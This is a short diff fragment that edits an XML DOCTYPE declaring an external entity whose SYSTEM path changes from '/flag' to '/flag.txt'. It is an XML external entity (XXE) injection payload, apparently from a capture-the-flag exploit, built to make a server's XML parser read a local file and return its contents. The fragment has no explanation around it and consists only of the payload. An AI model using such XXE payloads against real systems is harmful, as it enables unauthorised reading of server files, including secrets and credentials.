@@ -2,7 +2,7 @@
 
 <!DOCTYPE ANY [
 
-<!ENTITY f SYSTEM "/flag">
+<!ENTITY f SYSTEM "/flag.txt">
 
 ]>
 
